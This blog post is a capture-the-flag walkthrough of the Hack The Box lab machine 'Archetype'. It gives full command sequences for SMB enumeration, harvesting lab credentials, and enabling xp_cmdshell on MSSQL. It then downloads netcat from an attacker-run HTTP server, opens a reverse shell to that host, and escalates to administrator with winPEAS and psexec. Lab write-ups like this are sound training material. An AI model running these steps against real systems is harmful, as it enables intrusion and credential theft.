---
layout: post
title: 'HTB | Archetype'
date: 2022-02-28
permalink: /htb/archetype/
---


# [](#header-4)Enumeration

The nmap will show us:
{% highlight plain %}
$ nmap -sV 10.129.221.7 -oN nmap 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-28 11:45 EST
Nmap scan report for 10.129.221.7
Host is up (0.049s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.15 seconds
```

We will try to see which folders are share.
{% highlight plain %}
$ smbclient -L //10.129.221.7/
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

```

And then try to connect to **backups**:
{% highlight plain %}
$ smbclient //10.129.221.7/backups/
smb: \> ls
smb: \> get prod.dtsConfig
smb: \> exit
$ cat prod.dtsConfig  
```
There we can see:
{% highlight plain %}
Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
```



Now we can try to login with the scripts **mssqlclient.py**.
We will use the credentials provides by the **prod.dtsConfig** file.
{% highlight plain %}
$ sudo python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.221.7 -windows-auth
```

# [](#header-4)Foothold

Now we are in the SQL server. With the command **xp_cmdshell** we can try to execute the shell, but we will recieve the following error:
{% highlight plain %}
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell'
```
Now we need to activate xp_cmdshell. With the following command we can see all the config aviable.
{% highlight plain %}
SQL> sp_configure
```
We need to activate the advanced options:
{% highlight plain %}
SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
```
And then we can activate the shell:
{% highlight plain %}
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
```

Now we can get the **user flag**:
{% highlight plain %}
SQL> xp_cmdshell type C:\Users\sql_svc\Desktop\user.txt
```

We will make a reverse shell.
First we will start a nc in the port 443.
{% highlight plain %}
$ sudo nc -lvnp 443
{% endhighlight %}

Now we will create a http server in the same folder where we have the **nc64.exe** file.
{% highlight plain %}
$ sudo python3 -m http.server 80 
{% endhighlight %}

We need to download that file in the server. Because we don't have root access we will use the normal user.
{% highlight plain %}
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.88/nc64.exe -outfile nc64.exe"
{% endhighlight %}

The **http.server** will receive the following line:
{% highlight plain %}
10.129.221.7 - - [28/Feb/2022 12:51:53] "GET /nc64.exe HTTP/1.1" 200 -
{% endhighlight %}

Now we execute the command and send the cmd to the 443 port (where we are listening):
{% highlight plain %}
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.88 443"
{% endhighlight %}

# [](#header-4)Privilege Escalation

Now we will need to use **winPEAS** to do the privilege escalation. We will change the prompt to powershell, and download the file.
{% highlight plain %}
C:\Users\sql_svc\Downloads>powershell
PS C:\Users\sql_svc\Downloads> wget http://10.10.14.88/winPEASx64.exe -outfile winPEASx64.exe
{% endhighlight %}

In the http.server we can see that works:
{% highlight plain %}
C:\Users\sql_svc\Downloads>powershell
10.129.221.7 - - [28/Feb/2022 13:01:29] "GET /winPEASx64.exe HTTP/1.1" 200 -
{% endhighlight %}

No we will execute the script:
{% highlight plain %}
PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe
{% endhighlight %}

We can check the shell history for credentials (like **.bash_history**).
{% highlight plain %}
PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
        net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
{% endhighlight %}

With the password we have now we will use another script from impacket, **psexec.py**:
{% highlight plain %}
$ python3 psexec.py administrator@10.129.221.7
{% endhighlight %}

We can use the password from before and now we are in the Administrator user:
{% highlight plain %}
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
{% endhighlight %}
